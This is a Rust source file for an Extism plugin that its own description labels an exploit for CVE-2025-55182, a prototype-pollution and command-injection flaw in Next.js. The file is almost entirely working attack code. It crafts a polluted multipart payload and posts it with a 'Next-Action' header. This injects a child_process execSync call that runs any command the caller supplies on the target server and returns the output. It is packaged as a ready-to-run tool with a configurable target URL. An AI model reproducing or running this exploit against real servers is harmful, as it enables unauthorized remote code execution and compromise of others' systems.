use extism_pdk::*;
use serde_json::{json, Value};

#[plugin_fn]
pub fn name() -> FnResult<String> {
    Ok("cve-2025-55182-exploit".to_string())
}

#[plugin_fn]
pub fn description() -> FnResult<String> {
    Ok("Exploit plugin for CVE-2025-55182 - Next.js prototype pollution and command injection vulnerability".to_string())
}

#[plugin_fn]
pub fn json_schema() -> FnResult<String> {
    Ok(r#"{"type":"object","properties":{"base_url":{"type":"string","description":"Base URL of the target (defaults to http://localhost:3000)"},"executable":{"type":"string","description":"Command to execute (defaults to 'id')"}}}"#.to_string())
}

#[plugin_fn]
pub fn execute() -> FnResult<Json<Value>> {
    // Read input JSON args
    let input: Json<Value> = input()?;
    
    // Extract base_url and executable from input, or use defaults
    let base_url = input.0.get("base_url")
        .and_then(|v| v.as_str())
        .unwrap_or("http://localhost:3000")
        .to_string();
    
    let executable = input.0.get("executable")
        .and_then(|v| v.as_str())
        .unwrap_or("id")
        .to_string();
    
    // Craft the malicious chunk for prototype pollution
    let crafted_chunk = json!({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": json!({"then": "$B0"}).to_string(),
        "_response": {
            "_prefix": format!("var res = process.mainModule.require('child_process').execSync('{}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});", executable),
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    });
    
    // Create multipart form data
    // Format: --boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{json}\r\n--boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n--boundary--
    let boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    let file0_content = crafted_chunk.to_string();
    let file1_content = "\"$@0\"";
    
    let mut multipart_body = Vec::new();
    
    // File 0
    multipart_body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    multipart_body.extend_from_slice(b"Content-Disposition: form-data; name=\"0\"\r\n\r\n");
    multipart_body.extend_from_slice(file0_content.as_bytes());
    multipart_body.extend_from_slice(b"\r\n");
    
    // File 1
    multipart_body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    multipart_body.extend_from_slice(b"Content-Disposition: form-data; name=\"1\"\r\n\r\n");
    multipart_body.extend_from_slice(file1_content.as_bytes());
    multipart_body.extend_from_slice(b"\r\n");
    
    // Closing boundary
    multipart_body.extend_from_slice(format!("--{}--\r\n", boundary).as_bytes());
    
    // Make HTTP POST request
    let content_type = format!("multipart/form-data; boundary={}", boundary);
    let req = HttpRequest::new(base_url.as_str())
        .with_method("POST")
        .with_header("Next-Action", "x")
        .with_header("Content-Type", &content_type);
    
    let res = http::request::<Vec<u8>>(&req, Some(multipart_body))?;
    
    // Get response status and body
    let status_code = res.status_code();
    let body = String::from_utf8_lossy(&res.body()).to_string();
    
    // Create response
    let result = json!({
        "status_code": status_code,
        "response_body": body,
        "base_url": base_url,
        "executable": executable,
    });
    
    Ok(Json(result))
}
